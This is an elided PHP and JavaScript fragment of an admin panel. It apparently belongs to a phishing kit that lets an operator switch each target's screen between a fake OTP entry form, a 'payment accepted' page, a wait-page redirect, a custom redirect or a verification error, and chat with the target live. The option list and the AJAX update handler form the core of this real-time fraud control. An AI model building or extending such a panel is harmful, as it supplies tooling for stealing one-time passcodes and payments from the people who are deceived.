...
if ($isAdmin && isset($_POST['ajax']) && $_POST['ajax'] === 'update_sms') {
    ...
    if ($targetUserId === '') {
        ...
        panelSaveState($targetUserId, $smsMode, $customUrl, $instruction, $chatEnabled);
        ...
        <div>
            <div class="card">
                ...
                <form id="sms-form">
                    ...
                    <div class="row"><label>SMS Mode</label><select name="sms_mode" id="sms_mode">
                        <?php foreach (['default'=>'Show OTP form','payment_accept'=>'Show payment accepted','redirect_wait'=>'Redirect to wait.php','redirect_custom'=>'Custom redirection URL','error_verification'=>'Show verification error'] as $k=>$v): ?>
                            <option value="<?php echo $k; ?>" <?php echo $currentState['mode']===$k?'selected':''; ?>><?php echo $v; ?></option>
                        <?php endforeach; ?>
                    </select></div>
                    <div class="row"><label>Instruction</label><select name="instruction">
                    ...
                    <div class="row"><label>Custom URL</label><input type="text" name="custom_url" id="custom_url" value="<?php echo htmlspecialchars($currentState['custom_url']); ?>"></div>
            ...
            <div class="card" style="margin-top:12px">
                ...
                <div class="row" style="margin-top:8px"><textarea id="admin-chat-message" placeholder="Write your message"></textarea></div>
...
if(smsForm){smsForm.addEventListener('submit',async(e)=>{e.preventDefault();const formData=new FormData(smsForm);formData.append('ajax','update_sms');const res=await fetch('admin.php',{method:'POST',body:formData});const data=await res.json();flashMessage.style.display='block';flashMessage.classList.toggle('error',!data.success);flashMessage.textContent=data.message||'Update failed.';});}
</script>
</body>
</html>
